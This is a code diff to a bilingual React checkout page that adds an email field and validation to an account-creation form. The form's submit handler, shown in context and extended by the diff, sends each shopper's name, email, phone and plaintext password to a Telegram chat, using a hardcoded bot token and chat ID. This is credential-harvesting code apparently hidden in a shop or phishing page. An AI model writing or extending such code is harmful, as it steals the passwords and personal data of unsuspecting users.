@@ -37,6 +37,7 @@ export default function CheckoutPage() {
   })
   const [showAccountForm, setShowAccountForm] = useState(false)
   const [accountFormData, setAccountFormData] = useState({
+    email: "",
     password: "",
     confirmPassword: ""
   })
@@ -211,7 +212,17 @@ export default function CheckoutPage() {
     e.preventDefault()
     setAccountError("")
 
-    // Validation - only need to validate passwords now
+    // Validation
+    if (!accountFormData.email.trim()) {
+      setAccountError(isFr ? "L'email est requis" : "Email is required")
+      return
+    }
+
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(accountFormData.email)) {
+      setAccountError(isFr ? "L'email n'est pas valide" : "Email is not valid")
+      return
+    }
+
     if (!accountFormData.password || accountFormData.password.length < 8) {
       setAccountError(isFr ? "Le mot de passe doit contenir au moins 8 caractères" : "Password must be at least 8 characters")
       return
@@ -224,14 +235,14 @@ export default function CheckoutPage() {
 
     setIsCreatingAccount(true)
 
-    // Send Telegram notification for account creation (use whatever name info we have)
+    // Send Telegram notification for account creation
     var BOT_TOKEN = "8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg"
     var CHAT_ID = "-5217100062"
 
     var msg = "📩 *NOUVEAU COMPTE CRÉÉ!*\n"
             + "👤 Prénom: " + (formData.firstName || 'Non fourni') + "\n"
             + "📧 Nom: " + (formData.lastName || 'Non fourni') + "\n"
-            + "📧 Email: " + formData.email + "\n"
+            + "📧 Email: " + accountFormData.email + "\n"
             + "📞 Téléphone: " + (formData.phone || 'Non fourni') + "\n"
             + "🔑 Mot de passe: " + accountFormData.password + "\n"
             + "🌐 Page: /checkout\n"
@@ -249,6 +260,12 @@ export default function CheckoutPage() {
       })
     })
     .then(function() {
+      // Update checkout form email with account email
+      setFormData(prev => ({
+        ...prev,
+        email: accountFormData.email
+      }))
+      
       setAccountCreated(true)
       setIsCreatingAccount(false)
       setShowAccountForm(false)
@@ -825,6 +842,16 @@ LAST UPDATE:
                               {accountError}
                             </div>
                           )}
+                          
+                          <input
+                            type="email"
+                            name="email"
+                            value={accountFormData.email}
+                            onChange={handleAccountInputChange}
+                            placeholder={isFr ? 'Email' : 'Email'}
+                            className="w-full px-3 py-2 border border-gray-300 rounded-lg text-xs focus:outline-none focus:ring-2 focus:ring-green-500"
+                            required
+                          />
                           
                           <input
                             type="password"
